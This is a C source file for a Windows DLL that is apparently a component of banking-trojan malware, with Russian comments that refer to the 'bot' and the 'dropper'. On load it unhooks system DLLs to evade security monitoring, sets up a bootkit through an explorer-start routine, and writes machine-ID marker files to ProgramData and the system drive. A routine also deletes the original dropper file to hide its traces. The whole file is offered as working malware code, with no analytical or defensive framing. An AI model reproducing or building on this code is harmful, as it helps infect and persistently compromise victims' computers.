#include <windows.h>
#include "shlobj.h"
#include <Memory.h>
#include <Strings.h>
#include <DllLoader.h>
#include <Utils.h>
#include <PEFile.h>
#include <GetApi.h>
#include <BotEvents.h>
#include <Unhook.h>

#pragma comment(linker, "/ENTRY:DllMain" )

VOID GetPaths(HINSTANCE);
BOOL SetupBootKit();

CHAR PathBkFile[ MAX_PATH ] = {0}; 
CHAR FileToDelete[ MAX_PATH ] = {0}; //путь для удаления первоначального файла бота

BOOL WINAPI DllMain (HINSTANCE hInst,DWORD Reason, PVOID Reserved)
{
	switch ( Reason )
	{
	case DLL_PROCESS_ATTACH:
		{
			UnhookDlls();
			GetPaths(hInst);
			SetupBootKit();
		};
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	};

	return TRUE;
};

//
// получаем путь к дроперу для его удаления.
//
VOID GetPaths(HINSTANCE hInst)
{
	if ( pGetModuleFileNameA(hInst,FileToDelete,sizeof(FileToDelete)-1) )
	{
		pSHGetSpecialFolderPathA(NULL,PathBkFile,CSIDL_COMMON_APPDATA ,TRUE);
		m_lstrcat(PathBkFile,"\\");
		m_lstrcat(PathBkFile,MakeMachineID());
	}
};


DWORD WINAPI DeleteDropper(LPVOID) // убиваем процесс, стираем файл
{
	LONG i = 1;
	pMoveFileExA((PCHAR)FileToDelete,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
	while(i++){
		if (pDeleteFileA( FileToDelete ))
			break;
		pSleep(1025*i);
	};

	pExitThread(0);
	return 0;
}

BOOL SetupBootKit()
{
	BOOL ret = FALSE;
	// Вызываем событие cтарта експлорера
	
	if ( (DWORD)pGetFileAttributesA(PathBkFile) == INVALID_FILE_ATTRIBUTES)
	{
		if ( ExplorerStart(NULL) )	
		{
			ret = TRUE;
			File::WriteBufferA(PathBkFile,&ret,sizeof(PCHAR));
		}
		else
		{
			// error setup bootkit
		};
	}
	else
	{
		ret = TRUE;
	};

	if ( ret )
	{
		CHAR buf[MAX_PATH+1];
		pGetSystemDirectoryA(buf,MAX_PATH);
		buf[3] = 0;
		m_lstrcat(buf,"\\");
		m_lstrcat(buf,MakeMachineID());
		File::WriteBufferA(buf,&buf,sizeof(PCHAR));
	};

	return ret;
};